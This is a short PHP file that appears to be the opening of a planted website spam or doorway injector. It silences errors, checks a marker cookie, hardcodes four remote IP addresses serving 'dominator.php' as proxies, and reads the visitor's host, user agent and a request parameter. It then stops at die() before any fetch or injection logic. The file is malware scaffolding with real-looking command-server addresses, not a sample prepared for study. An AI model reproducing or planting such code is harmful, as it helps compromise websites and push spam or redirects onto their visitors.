<?php
error_reporting(0);
if (isset($_COOKIE['engine_ssl_'])) {
    return true;
}
$proxy_array = array("http://217.23.12.204/dominator.php", "http://159.8.34.18/~roboatom/dominator.php", "http://190.123.47.134/dominator.php", "http://109.236.91.19/dominator.php");
$scriptver = '013';
$doorexist = 'NO';
$remoteuri = @$_REQUEST['pgn'];
$hostname = @$_SERVER['HTTP_HOST'];
$hostname = strtolower($hostname);
$hostname = str_replace("www.", "", $hostname);
$cookie_host = $hostname;
$visitoragent = $_SERVER['HTTP_USER_AGENT'];
$workagent = 'fsbot';
$admin = 'dominator';

die();
?>